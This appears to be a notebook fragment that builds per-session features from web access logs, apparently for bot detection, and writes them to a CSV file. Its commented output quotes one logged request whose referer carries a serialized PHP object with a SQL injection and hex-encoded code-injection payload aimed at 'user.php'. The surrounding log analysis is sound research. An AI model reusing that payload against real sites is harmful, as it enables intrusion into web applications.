#  - - [09/Aug/2020:19:26:50 +0000] "POST /%75%73%65%72%2e%70%68%70 HTTP/1.1" 404 1872 "554fcae493e564ee0dc75bdf2ebf94caads|a:3:{s:2:\"id\";s:3:\"'/*\";s:3:\"num\";s:141:\"*/ union select 1,0x272F2A,3,4,5,6,7,8,0x7b247b24524345275d3b6469652f2a2a2f286d6435284449524543544f52595f534550415241544f5229293b2f2f7d7d,0--\";s:4:\"name\";s:3:\"ads\";}554fcae493e564ee0dc75bdf2ebf94ca" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:60.0) Gecko/20100101 Firefox/60.0"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_9-10_8.log
# -------line did not match expected format ---------
#  - - [09/Jul/2020:16:15:56 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [09/Jul/2020:17:53:19 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# -------line did not match expected format ---------
#  - - [10/Jul/2020:04:47:06 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
#
# done for  ../dataset/phase2/data/web_logs/humans/access_9_10_7.log

# %%
# print(log_features.session_features)

# %%
# for ses in log_features.session_features:
#     print(ses)

# %%
with open("human.csv",'w') as fd:
    features = """"session_id","Total_requests","Total_Bytes","Total_GET_requests","Total_POST_requests","Total_3xx_responses","Total_4xx_responses","per_image_requests","per_css_request","per_js_requests","Depth_SD","Max_requests_per_page","Average_requests_per_page","Max_sequential_request","per_sequential_requests","Session_time","Browsing_speed","SD_request_time"\n"""
    fd.write(features)

    for ses in log_features.session_features:
        fd.write(log_features.get_seseion_features_as_csv(ses))

# %%
# log_features.get_seseion_features_as_csv("0d5d2435pbn4mi4gj9spju5gia")
